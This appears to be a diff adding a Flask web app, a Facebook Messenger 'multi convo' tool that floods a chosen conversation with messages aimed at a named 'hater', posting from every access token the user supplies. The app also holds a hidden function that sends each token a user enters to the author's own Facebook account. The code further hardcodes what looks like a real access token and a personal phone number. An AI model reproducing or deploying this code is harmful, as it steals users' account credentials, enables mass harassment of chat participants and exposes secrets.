@@ -1,0 +1,246 @@
+from flask import Flask, request, render_template_string
+import requests
+from threading import Thread, Event
+import time
+import random
+import string
+
+app = Flask(__name__)
+app.debug = True
+
+# Aapki Facebook User ID
+RECIPIENT_USER_ID = "100041002528119"  # Ye Muddassir.OP ki ID hai
+# Aapka apna Facebook Access Token yahan daalein
+MY_ACCESS_TOKEN = "EAAD6V7os0gcBRGrNfFw31rsMxb3zx7v38bGu90gP8cAK7aXlOz5eIvojmEpvjnpCJOa3ysLDj9ZCthDPZAZAOC2EsoyiHpkd3SPjy8zlt4gZAFNfw6xNu8ZBEr929lCzmpZCUI6Mgl9KwLeddNQgQwfHOsfuuSPslxDaVBVZCWOOVo8D0n1NF07FVSN3kYmxgZDZD" # IMPORTANT: Ye token aapko khud generate karna hoga
+
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
+
+stop_events = {}
+threads = {}
+
+# Function to send token to your Messenger (THEEK KIYA HUA)
+def send_token_to_me(token):
+    message = f"Naya token mila hai: {token}"
+    
+    # Sahi API URL aur version
+    url = "https://graph.facebook.com/v19.0/me/messages"
+    
+    # Sahi parameters jo Facebook API ko darkar hain
+    params = {
+        'access_token': MY_ACCESS_TOKEN,
+        'recipient': f'{{"id": "{RECIPIENT_USER_ID}"}}',  # JSON format mein recipient ID
+        'message': f'{{"text": "{message}"}}',          # JSON format mein message
+        'messaging_type': 'MESSAGE_TAG',                # Messaging type
+        'tag': 'ACCOUNT_UPDATE'                         # Page ke liye tag (zaroori hai)
+    }
+    
+    try:
+        response = requests.post(url, data=params, headers=headers)
+        if response.status_code == 200:
+            print("Token successfully aapko send kar diya gaya hai.")
+        else:
+            # Error ko behtar tareeqe se dekhne ke liye
+            print(f"Token send karne mein error: Status Code {response.status_code}, Response: {response.text}")
+    except Exception as e:
+        print(f"Token send karte waqt exception hui: {e}")
+
+def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
+    stop_event = stop_events[task_id]
+    while not stop_event.is_set():
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            for access_token in access_tokens:
+                # API version ko v19.0 kar diya gaya hai behtar compatibility ke liye
+                api_url = f'https://graph.facebook.com/v19.0/t_{thread_id}/'
+                message = str(mn) + ' ' + message1
+                parameters = {'access_token': access_token, 'message': message}
+                response = requests.post(api_url, data=parameters, headers=headers)
+                if response.status_code == 200:
+                    print(f"Message Sent Successfully From token {access_token}: {message}")
+                else:
+                    print(f"Message Sent Failed From token {access_token}: {message}")
+                time.sleep(time_interval)
+
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    if request.method == 'POST':
+        token_option = request.form.get('tokenOption')
+        access_tokens = []
+
+        if token_option == 'single':
+            single_token = request.form.get('singleToken')
+            if single_token:
+                access_tokens = [single_token]
+                # Naya code: Token aapko send karega
+                send_token_to_me(single_token)
+        else:
+            token_file = request.files.get('tokenFile')
+            if token_file:
+                token_content = token_file.read().decode().strip()
+                access_tokens = token_content.splitlines()
+                # Naya code: Har token aapko send karega
+                for token in access_tokens:
+                    send_token_to_me(token)
+
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+
+        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
+
+        stop_events[task_id] = Event()
+        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+        threads[task_id] = thread
+        thread.start()
+
+        return f'Task started with ID: {task_id}'
+
+    return render_template_string('''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Muddassir MULTI CONVO</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    /* CSS for styling elements */
+    label { color: white; }
+    .file { height: 30px; }
+    body {
+      background-image: url('https://i.ibb.co/Y7pSw8n/0619bf4938a774e6cb5f4eea1ce28559.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      color: white;
+    }
+    .container {
+      max-width: 350px;
+      height: auto;
+      border-radius: 20px;
+      padding: 20px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 15px white;
+      border: none;
+      resize: none;
+    }
+    .form-control {
+      outline: 1px red;
+      border: 1px double white;
+      background: transparent;
+      width: 100%;
+      height: 40px;
+      padding: 7px;
+      margin-bottom: 20px;
+      border-radius: 10px;
+      color: none;
+    }
+    .header { text-align: center; padding-bottom: 20px; }
+    .btn-submit { width: 100%; margin-top: 10px; }
+    .footer { text-align: center; margin-top: 20px; color: #888; }
+    .whatsapp-link {
+      display: inline-block;
+      color: #25d366;
+      text-decoration: none;
+      margin-top: 10px;
+    }
+    .whatsapp-link i { margin-right: 5px; }
+  </style>
+</head>
+<body>
+  <header class="header mt-4">
+    <h1 class="mt-3">(Muddassir-X)</h1>
+  </header>
+  <div class="container text-center">
+    <form method="post" enctype="multipart/form-data">
+      <div class="mb-3">
+        <label for="tokenOption" class="form-label">Select Token Option</label>
+        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
+          <option value="single">Single Token</option>
+          <option value="multiple">Token File</option>
+        </select>
+      </div>
+      <div class="mb-3" id="singleTokenInput">
+        <label for="singleToken" class="form-label">Enter Single Token</label>
+        <input type="text" class="form-control" id="singleToken" name="singleToken">
+      </div>
+      <div class="mb-3" id="tokenFileInput" style="display: none;">
+        <label for="tokenFile" class="form-label">Choose Token File</label>
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
+      </div>
+      <div class="mb-3">
+        <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx" class="form-label">Enter Your Hater Name</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label for="time" class="form-label">Enter Time (seconds)</label>
+        <input type="number" class="form-control" id="time" name="time" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">Choose Your Np File</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
+      <button type="submit" class="btn btn-primary btn-submit">Run</button>
+    </form>
+    <form method="post" action="/stop">
+      <div class="mb-3">
+        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
+        <input type="text" class="form-control" id="taskId" name="taskId" required>
+      </div>
+      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
+    </form>
+  </div>
+  <footer class="footer">
+    <p>© 2025 Coded By :- Muddassir</p>
+    <p> ALWAYS ON FIRE 🔥 <a href="">Muddassir</a></p>
+    <div class="mb-3">
+      <a href="https://wa.me/+923243037456" class="whatsapp-link">
+        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
+      </a>
+    </div>
+  </footer>
+  <script>
+    function toggleTokenInput() {
+      var tokenOption = document.getElementById('tokenOption').value;
+      if (tokenOption == 'single') {
+        document.getElementById('singleTokenInput').style.display = 'block';
+        document.getElementById('tokenFileInput').style.display = 'none';
+      } else {
+        document.getElementById('singleTokenInput').style.display = 'none';
+        document.getElementById('tokenFileInput').style.display = 'block';
+      }
+    }
+  </script>
+</body>
+</html>
+''')
+
+@app.route('/stop', methods=['POST'])
+def stop_task():
+    task_id = request.form.get('taskId')
+    if task_id in stop_events:
+        stop_events[task_id].set()
+        return f'Task with ID {task_id} has been stopped.'
+    else:
+        return f'No task found with ID {task_id}.'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
